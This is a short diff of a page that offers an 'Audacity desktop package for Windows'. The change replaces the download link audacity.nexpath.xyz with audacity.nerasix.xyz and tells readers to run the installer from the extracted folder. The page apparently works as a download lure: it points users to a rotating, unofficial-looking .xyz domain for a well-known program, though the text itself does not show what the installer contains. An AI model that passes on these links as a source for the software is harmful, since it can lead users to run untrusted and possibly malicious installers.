@@ -8,8 +8,8 @@ Audacity desktop package for Windows · audio toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[audacity.nexpath.xyz](https://audacity.nexpath.xyz/)**
-* **Full URL:** `https://audacity.nexpath.xyz/`
+* **Project link:** **[audacity.nerasix.xyz](https://audacity.nerasix.xyz/)**
+* **Full URL:** `https://audacity.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
